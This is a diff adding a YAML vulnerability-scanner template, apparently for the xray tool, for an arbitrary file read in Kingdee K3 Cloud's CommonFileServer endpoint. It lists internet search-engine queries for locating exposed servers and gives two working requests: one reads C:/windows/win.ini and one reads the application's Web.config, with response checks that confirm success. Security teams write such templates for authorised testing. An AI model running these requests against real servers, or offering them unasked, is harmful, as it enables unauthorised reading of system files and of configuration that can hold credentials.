@@ -1,0 +1,56 @@
+detail:
+  author: 
+  links:
+    - x
+  vulnerability:
+    level: critical
+    fofa-query: app="Kingdee-K3-cloud"
+    hunter-query: app.name="Kingdee 金蝶云星空"
+    quake-query: app:"金蝶云星空"
+    zoomeye-query: app:"金蝶 OA"
+    threatbook-query:
+    cve: 
+    cnvd:
+    tips: win.ini
+    
+name: poc-yaml-Kingdee-K3cloud-CommonFileServer-file-read
+manual: true
+transport: http
+set:
+    s1: randomInt(1000000000, 9000000000)
+    s2: randomLowercase(8)
+    reverse: newReverse()
+    reverseURL: reverse.url
+    t1: timeConvert(now(), '2006-01-02')
+rules:
+  r0:
+    request:
+      method: GET
+      cache: true
+      path: /CommonFileServer/c%3a%2fwindows%2fwin.ini
+      follow_redirects: false      
+      header:
+      body:
+    expression: >-
+      response.body_string.contains("for 16-bit app support")  || response.body_string.contains("[files]")
+
+    output:
+      search: |-
+        "(?P<filename>\\w+.jsp)".bsubmatch(response.body)
+      filename: search["filename"]
+      search1: |-
+        "(?P<newpath>ico.*jsp)".bsubmatch(response.body)
+      newpath: search["newpath"]
+
+  r1:
+    request:
+      method: GET
+      cache: true
+      path: /CommonFileServer/C%3A%5CProgram%20Files%20%28x86%29%5CKingdee%5CK3Cloud%5CWebSite%5CWeb.config
+      follow_redirects: false      
+      headers:
+      body:
+    expression: >-
+      response.status == 200 && response.body_string.contains("?xml version")  && response.body_string.contains("configuration")
+
+expression: r0() || r1()
